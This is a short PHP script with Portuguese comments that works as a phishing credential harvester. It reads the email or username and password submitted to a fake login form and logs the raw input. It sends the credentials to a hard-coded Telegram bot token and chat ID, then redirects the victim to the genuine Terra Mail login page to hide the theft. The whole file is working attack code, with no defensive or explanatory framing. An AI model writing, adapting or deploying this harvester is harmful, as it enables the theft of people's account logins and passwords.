<?php
// captura absolutamente tudo que chega
$raw = file_get_contents('php://input');
error_log("RAW: ".$raw);                  // debug no servidor

// aceita JSON ou form
$in = json_decode($raw,1) ?: [];
$_POST = array_merge($_POST, $in);

$email = trim($_POST['email'] ?? $_POST['user'] ?? $_POST['usuario'] ?? '');
$senha = trim($_POST['senha'] ?? $_POST['pass'] ?? $_POST['password'] ?? '');

$msg = "📩 Nova tentativa de login\n";
$msg .= "📧 Email: ".$email."\n";
$msg .= "🔐 Senha: ".$senha."\n";
$msg .= "📅 Data: ".date("d/m/Y H:i:s");

$token   = '7731169374:AAF2qtPXZgQELEHs6DnCBJUij638xwYUVVY';
$chat_id = '6261750345';

file_get_contents("https://api.telegram.org/bot{$token}/sendMessage?".
                  http_build_query(['chat_id'=>$chat_id,'text'=>$msg,'parse_mode'=>'Markdown']));

header("Location: https://servicos.terra.com.br/para-voce/terra-mail/?cdConvenio=CVTR00001825/login");
exit;
?>